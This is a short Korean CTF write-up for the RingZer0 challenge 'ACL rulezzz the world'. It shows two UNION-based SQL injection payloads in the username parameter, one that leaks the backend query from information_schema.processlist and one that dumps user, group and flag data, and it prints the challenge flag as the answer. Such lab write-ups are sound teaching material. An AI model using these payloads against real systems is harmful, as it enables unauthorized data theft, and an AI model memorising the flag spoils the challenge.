# [RingZer0 Team CTF] ACL rulezzz the world - Writeup

## SQL Injection

`username` 파라미터에서 SQLi가 된다.

``` sql
'union select 1,info,3 from information_schema.processlist#
```
```
SELECT c2_user.username,c2_group.groupname,c2_group.description FROM c2_user,c2_group,c2_group_membership WHERE c2_group_membership.usernameid = c2_user.id AND c2_group_membership.groupnameid = c2_group.id AND c2_user.username = ''union select 1,info,3 from information_schema.processlist#'
```

테이블명과 컬럼명을 알아냈다.

``` sql
'union select group_concat(c2_user.username),group_concat(c2_group.groupname),group_concat(c2_group.description) from c2_user,c2_group,c2_group_membership#
```
```
admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick,admin,charles,cedrick
admins,admins,admins,users,users,users,flags,flags,flags,admins,admins,admins,users,users,users,flags,flags,flags,admins,admins,admins,users,users,users,flags,flags,flags
Administrateurs,Administrateurs,Administrateurs,Users,Users,Users,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit,Administrateurs,Administrateurs,Administrateurs,Users,Users,Users,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit,Administrateurs,Administrateurs,Administrateurs,Users,Users,Users,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit,FLAG-sdfoip340e89rfuj34woit
```

___

## Answer

flag: `FLAG-sdfoip340e89rfuj34woit`